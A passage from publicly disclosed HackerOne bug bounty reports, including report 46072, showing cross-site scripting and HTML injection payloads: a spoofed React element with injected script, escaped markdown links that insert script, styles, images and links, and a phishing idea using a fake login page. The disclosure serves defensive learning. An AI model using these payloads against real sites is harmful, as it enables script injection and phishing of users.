  method: 'post', 
  contentType: "application/json", 
  data: JSON.stringify({ 
    state: "open", 
    substate: "triaged", 
    report_ids: [… id of the report …], 
    reply_action: "change-state", 
    reference: {
      _isReactElement: true,
      _store: {},
      type:"body",
      props: {
        dangerouslySetInnerHTML: {
          __html:
            "<h1>Arbitrary HTML</h1><script>alert('No CSP Support :(')</script>"
        }
      }
    }   
  }) 
})
```  

Now, as a victim, open the report and observe that arbitrary HTML has been inserted.

For the curious, here's what the fields in the fake React element do:

- `_isReactElement` tricks React into thinking it's rendering an element
- `_store` prevents a javascript error (React tries writing some properties of this field)
- `type` is the type of element to be rendered
- `props` is the properties of the spoofed element.  `dangerouslySetInnerHTML` is a [special field](http://facebook.github.io/react/docs/special-non-dom-attributes.html) that lets you manually set the inner HTML for the element.

---

### [Vulnerability with the way \ escaped characters in <http://danlec.com> style links are rendered](https://hackerone.com/reports/46072)

- **Report ID:** `46072`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** HackerOne
- **Reporter:** @danlec
- **Bounty:** 5000 usd
- **Disclosed:** 2015-02-03T17:34:45.891Z
- **CVE(s):** -

**Vulnerability Information:**

> <http://\<div\ style=\"font-size:24px;background:red;color:white;width:100%;height:48px;line-height:48px;text-align:center;\"\>Uh\ oh!</div\>>

## Basic POC:

Sequences like `<http://\<h1\>test\</h1\>>` are rendered as `http://<h1>test</h1>`

## Examples of what could be done with this:

Obviously there's a whole variety of stuff that can be done when you can inject arbitrary HTML, even in spite of the CSP protection.

We can put in elements we're not supposed to (see above, where we've inserted an attention grabbing `div`)

We can put in "arbitrary" images (i.e. profile pictures)

```
<http://\<img\ src=\"https://profile-photos.hackerone-user-content.com/production/000/000/013/76b3a9e70495c3b7340e33cdf5141660ae26489b_large.png?1383694562\"\>
```

> <http://\<img\ src=\"https://profile-photos.hackerone-user-content.com/production/000/000/013/76b3a9e70495c3b7340e33cdf5141660ae26489b_large.png?1383694562\"\>>

We can put in our own `<style>` tags, e.g. using

```
<http://\<style\>.markdownable\ blockquote{color:white;border:0;padding:0;margin:0;}a{color:red !important}\</style\>>
```

> <http://\<style\>.markdownable\ blockquote{color:white;border:0;padding:0;margin:0;}a{color:red\ !important}\</style\>>

## Serious Exploits

We can bypass HackerOne's link /redirect:

```
<http://\<a\ href=\"http://danlec.com\"\>Redirect\ bypassed\</a\>>
```

If we wanted to be particularly sneaky, we could use CSS to make a link cover the whole submission, so clicking anywhere would activate the link … which might allow us to do some phishing by having the link go to a fake HackerOne login screen.

> <http://\<a\ href=\"http://danlec.com\"\>Redirect\ bypassed\</a\>>

For browsers without good CSP support, like IE11, we can use this to run script on a victim when they try to view our submission using

```
<http://\<img\ style=\"display:none\"\ src=0\ onerror=\"alert(\'Uh\ oh\')\"\>>
```

> <http://\<img\ style=\"display:none\"\ src=0\ onerror=\"alert(\'Uh\ oh\')\"\>>

(If you're using IE11 for some reason, you'll get an alert when you view this submission)

---
